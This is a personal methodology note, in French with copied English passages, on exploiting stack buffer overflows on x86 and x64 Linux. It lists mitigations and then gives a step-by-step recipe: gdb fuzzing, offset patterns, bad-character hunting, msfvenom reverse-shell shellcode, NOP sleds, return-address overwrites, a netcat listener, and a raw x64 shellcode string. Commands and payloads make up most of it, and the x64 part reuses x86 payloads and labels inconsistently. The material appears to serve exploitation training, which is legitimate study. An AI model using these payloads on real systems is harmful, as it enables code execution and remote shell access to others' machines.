
[[#Kezako ?]]
[[#CPU Instruction Cycle]]
[[#Rappel fonctionnement mémoire et registres]]
[[#Prevention]]

[[#Identifier la vulnérabilité]]
[[#Exploitation]]


---
# Kezako ?

Un Buffer Overflow est un débordement de mémoire tampon. Cela consiste à envoyer plus de caractères que prévus par le buffer afin d'écraser les zones de mémoire adjacentes. Si l'entrée utilisateur n'est pas contrôlée et des protections ne sont pas en place, alors il est possible d'obtenir une exécution de code arbitraire en prenant le contrôle du pointeur d'instruction et lui indiquant l'adresse mémoire ou se situe notre shellcode.


---
# CPU Instruction Cycle

The instruction set describes the totality of the machine instructions of a processor. The scope of the instruction set varies considerably depending on the processor type. Each CPU may have different instruction cycles and instruction sets, but they are all similar in structure, which we can summarize as follows:

|**Instruction**|**Description**|
|---|---|
|`1. FETCH`|The next machine instruction address is read from the `Instruction Address Register` (`IAR`). It is then loaded from the `Cache` or `RAM` into the `Instruction Register` (`IR`).|
|`2. DECODE`|The instruction decoder converts the instructions and starts the necessary circuits to execute the instruction.|
|`3. FETCH OPERANDS`|If further data have to be loaded for execution, these are loaded from the cache or `RAM` into the working registers.|
|`4. EXECUTE`|The instruction is executed. This can be, for example, operations in the `ALU`, a jump in the program, the writing back of results into the working registers, or the control of peripheral devices. Depending on the result of some instructions, the status register is set, which can be evaluated by subsequent instructions.|
|`5. UPDATE INSTRUCTION POINTER`|If no jump instruction has been executed in the EXECUTE phase, the `IAR` is now increased by the length of the instruction so that it points to the next machine instruction.|


---
# Rappel fonctionnement mémoire et registres

[[BASES SYSTEME#MEMOIRE]]
[[BASES SYSTEME#CPU REGISTERS]]


---
# Prevention

The best protection against buffer overflows is security-conscious programming. Software developers should inform themselves about the relevant pitfalls and strive for deliberately secure programming. Besides, there are security mechanisms that support developers and prevent users from exploiting such vulnerabilities.

These include security mechanisms:

1. Canaries
2. Address Space Layout Randomization (ASLR)
3. Data Execution Prevention (DEP)


## Canaries

The `canaries` are known values written to the stack between buffer and control data to detect buffer overflows. The principle is that in case of a buffer overflow, the canary would be overwritten first and that the operating system checks during runtime that the canary is present and unaltered.



## Address Space Layout Randomization (ASLR)

Address Space Layout Randomization (`ASLR`) is a security mechanism against buffer overflows. It makes some types of attacks more difficult by making it difficult to find target addresses in memory. The operating system uses ASLR to hide the relevant memory addresses from us. So the addresses need to be guessed, where a wrong address most likely causes a crash of the program, and accordingly, only one attempt exists.



## Data Execution Prevention (DEP)

`DEP` is a security feature available in Windows XP, and later with Service Pack 2 (SP2) and above, programs are monitored during execution to ensure that they access memory areas cleanly. DEP terminates the program if a program attempts to call or access the program code in an unauthorized manner.

---
# Identifier la vulnérabilité

1. Vérifier que l'ASLR est désactivé
2. Vérifier que la stack sur le binaire est exécutable
3. Réussir à prendre le contrôle du pointeur d'instruction (EIP / RIP)

## Linux

1. Vérifier si l'ASLR est désactivé -> 0
- **0: No randomization.** All memory addresses are static.
- **1: Conservative randomization.** The shared libraries, stack, mmap(), and VDSO page are randomized.
- **2: Complete randomization**. In addition to the randomized items at level 1, memory managed through brk() is also randomized.

```sh
cat /proc/sys/kernel/randomize_va_space
```

2. Vérifier que la stack sur le binaire est exécutable (GNU_STACK -> Flag E)

```sh
readelf -l <programme>
```

## Windows

Vérifier si l'ASLR est désactivé -> ASLR NOTSET / OFF

```powershell
Get-ProcessMitigation -System
```



---
# Exploitation

> [!warning]
> Tester l'exploit sur un environnement monté identique a celui de la victime pour s'assurer qu'il ne cause pas de crash système

## Méthodo

1. Prendre le contrôle du pointeur d'instruction.
2. Déterminer la longueur du shellcode à injecter.
3. Identifier les caractères non acceptés par le programme.
4. Générer le shellcode.
5. Identifier l'adresse de retour.
6. Envoyer l'exploit au programme.

## x86


[[#1. Prendre le contrôle de l'EIP (Pointer d'instruction)]]
[[#2. Déterminer la longueur pour le Shell code]]
[[#3. Identifier les mauvais caractères]]
[[#4. Générer le Shell code]]
[[#5. Identifier l'adresse de retour]]


# 1. Prendre le contrôle de l'EIP (Pointer d'instruction)

Prendre contrôle de l'EIP (Pointer d'instruction) pour faire le jump sur la bonne adresse ou se trouve le shellcode afin de l'exécuter.

## Segmentation Fault

Essayer d'overwrite l'EIP avec un nombre de caractères envoyés.

```shell-session
gdb -q <prog>
```

```assembly
set disassembly-flavor intel
```

```
run $(python -c "print '\x55' * 1200")
```

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

Vérifier que l'adresse de l'EIP a été overwrite (0x55555555...)

```shell-session
info registers 
```

## Determiner l'Offset

Déterminer le nombre d'octets nécessaires pour overwrite le buffer.

1. Creér un pattern

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
cat pattern.txt
```

2. Lancer gdb sur le programme

```shell-session
gdb -q <prog>
```

3. Utiliser le pattern genéré

```shell-session
(gdb) run $(python -c "print '<pattern>'") 
```


4. Identifier l'adresse de l'EIP

```shell-session
(gdb) info registers eip
```

5. Calculer le nombre exact de caractères nécessaires pour jump sur l'EIP

```shell-session
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_adresse>
```

6. Envoyer le nombre de caractères identifiés pour overwrite l'EIP et rajouter quelques caractères afin de confirmer.

```shell-session
run $(python -c "print '\x55' * <nb_caractères> + '\x66' * 4")
```




---
# 2. Déterminer la longueur pour le Shell code


1. Générer un shellcode avec msfvenom (reverse shell), identifier le payload size et reserver au moins le double.

```shell-session
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```


Rajouter des NOPS (no operations) entre le buffer et le shellcode (optionnel)

1. We need a total of X octets to get to the `EIP`.
2. Here, we can use an additional `100 octets` of `NOPs`
3. `150 octets` for our `shellcode` (payload size x2).
4. 4 bytes for the EIP

  Determine the Length for Shellcode

```shell-session
   Buffer = "\x55" * (<nb_caractères> - 100 - 150) = ?
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```

exemple avec 1036 octets pour arriver à l'EIP
![[Pasted image 20250523011000.png]]

# 3. Identifier les mauvais caractères


Identifier les caractères rejetés par l'applications (entre x00 et xff)

1. Genérer la liste de caractère suivante 

```shell-session
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

2. Calculer la longueur de char (logiquement 256 octets)

```shell-session
echo $CHARS | sed 's/\\x/ /g' | wc -w
```

3. Recalculer la taille du buffer

```shell-session
Buffer = "\x55" * (<nb_caractères> - 256) = ?
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

4. Afficher la fonction main

```shell-session
(gdb) disas main
```

5. Mettre un breakpoint sur la première fonction

```shell-session
(gdb) break <funct> 
```

6. Send CHARS

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - 256) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```


7. Afficher la stack

```
x/2000xb $esp+500
```

8. trouver l'adresse a laquelle se termine nos x55 et ou commence x00, x01, x02...
9. Identifier les caractères manquants ou modifiés un par un.
10. Soustraire le nombre de mauvais caractères pour recalculer le buffer
11. Renvoyer le CHARS sans les mauvais caractères

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - X) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
```


REPETER LE PROCESS JUSQU'A + AUCUN MAUVAIS CARACTERE.


# 4. Générer le Shell code

Régénérer un Shell code en prenant bien en compte:

- `Architecture`
- `Platform`
- `Bad Characters`

1. Générer le shell code
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "\x00\x09..." --out shellcode
```

```shell-session
cat shellcode
```

2. Reformatter en une seule ligne

3. Recalculer le buffer avec le payload size cette fois ci.

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

4. Envoyer le payload final

```shell-session
run $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

5. Vérifier que le premier octet du shell code est intègre après les NOPs dans la stack

```shell-session
x/2000xb $esp+550
```


Possible d'afficher la taille de la stack

```
info proc all
```


# 5. Identifier l'adresse de retour

1. Choisir une adresse dans la stack qui correspond a nos NOPs (0x90) et qui ne contient aucun mauvais caractère identifiés précédemment.

2. Modifier l'EIF avec l'adresse choisie (en Little Endian donc à l'envers)

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x4c\xd6\xff\xff"
```

3. Lancer listener netcat

```bash
nc -nvlp 9001
```

4. Exécuter le programme en dehors de gdb avec le payload final

```shell-session
./<prog> $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
```

```shell-session
(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"') | ./<prog>
```




---
# x64


[[#1. Prendre le contrôle du RIP (Pointer d'instruction)]]
[[#2. Déterminer la longueur pour le Shell code]]
[[#3. Identifier les mauvais caractères]]
[[#4. Générer le Shell code]]
[[#5. Identifier l'adresse de retour]]


# 1. Prendre le contrôle du RIP (Pointer d'instruction)

Prendre contrôle du RIP (Pointer d'instruction) pour faire le jump sur la bonne adresse ou se trouve le shellcode afin de l'exécuter.

## Segmentation Fault

Essayer d'overwrite le RIP avec un nombre de caractères envoyés.

```shell-session
gdb -q <prog>
```

```assembly
set disassembly-flavor intel
```

```
run $(python -c "print '\x55' * 1200")
```

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

Vérifier que l'adresse du RIP a été overwrite (0x55555555...)

```shell-session
info registers rip
```

Si le rip n'apparait pas overwrite pas de panique, -> determiner l'offset.

## Determiner l'Offset

Déterminer le nombre d'octets nécessaires pour overwrite le buffer.

1. Creér un pattern depuis gdb peda

```shell-session
pattern create 200
```

2. Utiliser le pattern genéré

```shell-session
run '<pattern>'
```

3. Identifier l'offset

```shell-session
pattern_search
```

![[Pasted image 20250529053005.png]]

4. Envoyer le nombre de caractères identifiés pour overwrite le RIP et rajouter 8 bytes afin de confirmer.

```shell-session
run $(python -c "print '\x55' * <nb_caractères> + '\x41\x41\x41\x41\x41\x41\x00\x00'")
```


---
# 2. Déterminer la longueur pour le Shell code


1. Générer un shellcode avec msfvenom (reverse shell), identifier le payload size et reserver au moins le double.

```shell-session
msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
```


Rajouter des NOPS (no operations) entre le buffer et le shellcode (optionnel)

1. We need a total of X octets to get to the `RIP`.
2. Here, we can use an additional `100 octets` of `NOPs`
3. `150 octets` for our `shellcode` (payload size x2).
4. 8 bytes for the RIP

  Determine the Length for Shellcode

```shell-session
   Buffer = "\x55" * (<nb_caractères> - 100 - 150) = ?
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x41" * 6 + "\x41" * 2
```

exemple avec 1036 octets pour arriver à l'EIP
![[Pasted image 20250523011000.png]]

# 3. Identifier les mauvais caractères


Identifier les caractères rejetés par l'applications (entre x00 et xff)

1. Genérer la liste de caractère suivante 

```shell-session
CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

2. Calculer la longueur de char (logiquement 256 octets)

```shell-session
echo $CHARS | sed 's/\\x/ /g' | wc -w
```

3. Recalculer la taille du buffer

```shell-session
Buffer = "\x55" * (<nb_caractères> - 256) = ?
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   RIP = "\x66" * 8
```

4. Afficher la fonction main

```shell-session
disas main
```

5. Mettre un breakpoint sur la première fonction

```shell-session
break <funct> 
```

6. Send CHARS

```shell-session
run $(python -c 'print "\x55" * (<nb_caractères> - 256) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 8')
```


7. Afficher la stack

```
x/2000xb $esp+500
```

8. trouver l'adresse a laquelle se termine nos x55 et ou commence x00, x01, x02...
9. Identifier les caractères manquants ou modifiés un par un.
10. Soustraire le nombre de mauvais caractères pour recalculer le buffer
11. Renvoyer le CHARS sans les mauvais caractères

```shell-session
(gdb) run $(python -c 'print "\x55" * (<nb_caractères> - X) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 8')
```


REPETER LE PROCESS JUSQU'A + AUCUN MAUVAIS CARACTERE.


# 4. Générer le Shell code

Régénérer un Shell code en prenant bien en compte:

- `Architecture`
- `Platform`
- `Bad Characters`


shell code pour appeler /bin/sh -> https://shell-storm.org/shellcode/files/shellcode-806.html


1. Générer le shell code
```shell-session
msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "\x00\x09..." --out shellcode
```

```shell-session
cat shellcode
```

2. Reformatter en une seule ligne

3. Recalculer le buffer avec le payload size cette fois ci.

```shell-session
Buffer = "\x55" * (<nb_caracteres> - 100 - <payload_size>) = ?
     NOPs = "\x90" * 100
Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
      EIP = "\x66" * 4'
```

4. Envoyer le payload final

```shell-session
run $(python -c 'print "\x55" * (<nb_caracteres> - 100 - <payload_size>) + "\x90" * 100 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
```

5. Vérifier que le premier octet du shell code est intègre après les NOPs dans la stack

```shell-session
x/2000xb $esp+550
```


Possible d'afficher la taille de la stack

```
info proc all
```


# 5. Identifier l'adresse de retour

1. Compiler le code suivant
getenvvar.c
```
// code by Jon Erickson, page 147 and 148 of Hacking: The Art of Exploitation, 2nd Edition

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```

```
gcc getenvvar.c -o getenvvar
```

2. Exporter le shell code dans une variable d'environment

```
export PWN=`python2.7 -c 'print "\x48\x31\xc9\x48\x81\xe9\xfd\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xf2\xfc\x73\xdf\x15\xee\x93\x23\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xba\x44\x5c\xbd\x7c\x80\xbc\x50\x9a\xfc\xea\x8f\x41\xb1\xc1\x7d\x98\xc7\x2b\xd0\x10\xee\x93\x23"'`
```

3. Identifier l'adresse de retour

```
getenvvar PWN ./<prog>
```


4. Modifier l'EIF avec l'adresse de retour (en Little Endian donc à l'envers + canonical (0x7fffffffe7b9 -> \xb9\xe7\xff\xff\xff\x7f\x00\x00))

5. Lancer listener netcat (ou pas)

```bash
nc -nvlp 9001
```

4. Exécuter le programme en dehors de gdb avec l'adresse de retour

```shell-session
./<prog> $(python -c 'print "\x55" * <nb_caracteres> + "\xb9\xe7\xff\xff\xff\x7f\x00\x00"')
```

```shell-session
(python -c 'print "\x55" * <nb_caracteres> + "\xb9\xe7\xff\xff\xff\x7f\x00\x00"') | ./<prog>
```
